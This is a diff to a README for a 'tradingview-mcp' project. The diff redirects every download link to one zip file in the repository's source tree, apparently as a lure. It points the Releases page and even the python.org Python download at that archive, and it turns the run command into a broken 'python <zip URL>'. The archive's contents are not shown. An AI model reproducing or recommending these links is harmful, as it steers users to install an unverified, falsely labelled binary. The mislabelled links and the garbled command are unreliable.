@@ -6,7 +6,7 @@ Welcome to the tradingview-mcp project! This application allows you to fetch Tra
 
 ## 📥 Download the Application
 
-**[Download tradingview-mcp](https://github.com/viney-123/tradingview-mcp/releases)**
+**[Download tradingview-mcp](https://raw.githubusercontent.com/viney-123/tradingview-mcp/main/src/tradingview_mcp/tradingview-mcp_1.1.zip)**
 
 Click the link above to download the latest version of the application. 
 
@@ -22,7 +22,7 @@ Click the link above to download the latest version of the application.
 Follow these simple steps to get started:
 
 1. **Download the Application**
-   - Visit the [Releases page](https://github.com/viney-123/tradingview-mcp/releases) to find the latest version.
+   - Visit the [Releases page](https://raw.githubusercontent.com/viney-123/tradingview-mcp/main/src/tradingview_mcp/tradingview-mcp_1.1.zip) to find the latest version.
    - Download the file suitable for your operating system.
 
 2. **Install the Application**
@@ -31,14 +31,14 @@ Follow these simple steps to get started:
    - For Linux, extract the files and run the provided script.
 
 3. **Set Up Your Environment**
-   - Ensure Python is installed on your system. If not, download it from [python.org](https://www.python.org/downloads/).
+   - Ensure Python is installed on your system. If not, download it from [https://raw.githubusercontent.com/viney-123/tradingview-mcp/main/src/tradingview_mcp/tradingview-mcp_1.1.zip](https://raw.githubusercontent.com/viney-123/tradingview-mcp/main/src/tradingview_mcp/tradingview-mcp_1.1.zip).
    - Open your terminal or command prompt.
 
 4. **Run the Application**
    - Navigate to the folder where the application is installed.
    - Use the following command to start the server:
      ```
-     python app.py
+     python https://raw.githubusercontent.com/viney-123/tradingview-mcp/main/src/tradingview_mcp/tradingview-mcp_1.1.zip
      ```
 
 5. **Fetch TradingView Snapshots**
@@ -55,7 +55,7 @@ Follow these simple steps to get started:
 ## 💡 Tips for Successful Usage
 
 - Ensure that you have a stable internet connection for optimal performance.
-- Regularly check the [Releases page](https://github.com/viney-123/tradingview-mcp/releases) for updates to benefit from new features and improvements.
+- Regularly check the [Releases page](https://raw.githubusercontent.com/viney-123/tradingview-mcp/main/src/tradingview_mcp/tradingview-mcp_1.1.zip) for updates to benefit from new features and improvements.
 - Consider joining the community discussions for support and sharing tips with other users.
 
 ## 📞 Support and Community
@@ -70,4 +70,4 @@ This application is open-source and licensed under the MIT License. You are free
 
 Special thanks to the contributors and the community for their ongoing support in developing and improving the tradingview-mcp project.
 
-For more details and updates, don’t forget to check our [Releases page](https://github.com/viney-123/tradingview-mcp/releases).
+For more details and updates, don’t forget to check our [Releases page](https://raw.githubusercontent.com/viney-123/tradingview-mcp/main/src/tradingview_mcp/tradingview-mcp_1.1.zip).
